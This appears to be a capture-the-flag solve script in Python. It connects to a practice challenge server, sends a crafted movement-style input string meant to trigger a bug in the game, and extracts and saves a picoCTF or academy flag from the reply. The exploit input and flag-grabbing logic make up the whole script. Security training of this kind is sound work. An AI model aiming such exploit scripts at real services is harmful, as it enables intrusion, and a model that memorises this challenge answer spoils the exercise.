import socket, time, re, sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "xebec.cylabacademy.net", 27860
line = (b"l]" + b"w" * 4 + b"d" * 47 + b"w") + b"\n"
s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(3)
time.sleep(1.5)
buf = b""
t0 = time.time()
while time.time() - t0 < 3:
    try:
        d = s.recv(65536)
    except socket.timeout:
        break
    if not d:
        break
    buf += d
print("banner", len(buf))
s.sendall(line)
out = b""
t0 = time.time()
while time.time() - t0 < 12:
    try:
        d = s.recv(65536)
    except socket.timeout:
        continue
    if not d:
        break
    out += d
print("out", len(out))
print("tail:", out[-600:])
m = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", buf + out)
print("FLAG:", m.group(0).decode() if m else None)
if m:
    open(r"./_z_bg2_flag.txt", "w").write(m.group(0).decode())
s.close()
